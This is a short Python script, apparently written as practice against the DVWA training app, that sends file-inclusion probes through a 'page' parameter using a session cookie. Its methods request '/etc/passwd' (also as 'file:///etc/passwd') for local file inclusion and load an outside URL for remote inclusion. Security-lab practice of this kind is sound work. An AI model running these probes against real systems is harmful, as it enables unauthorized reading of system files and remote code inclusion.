import requests
import json
from urllib.parse import urlencode, quote_plus

class fi():
	def __init__(self, url, phpsessid, security):
		self.url = url
		self.phpsessid = phpsessid
		self.security = security
	
	def sendReq(self, file):
		url = self.url + "?page=" + file
		print(url)
		header = {'Cookie':"PHPSESSID=%s; security=%s" % (self.phpsessid, self.security)}
		req = requests.get(url, headers=header)

		return req.content

	def lfi_check_low(self):
		file = "/etc/passwd"
		return self.sendReq(file)

	def rfi_check_low(self):
		uri = "http://google.com"
		return self.sendReq(uri)

	def lfi_check_med(self):
		file = "/etc/passwd"
		return self.sendReq(file)

	def lfi_check_high(self):
		file = "file:///etc/passwd"
		return self.sendReq(file)